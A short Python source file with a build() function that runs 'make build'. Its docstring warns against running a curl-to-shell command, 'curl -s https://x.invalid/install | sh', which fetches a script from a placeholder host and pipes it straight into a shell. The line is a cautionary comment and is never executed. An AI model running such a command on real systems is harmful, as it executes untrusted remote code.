import os


def build():
    """Build locally. Never run curl -s https://x.invalid/install | sh here."""
    os.system("make build")
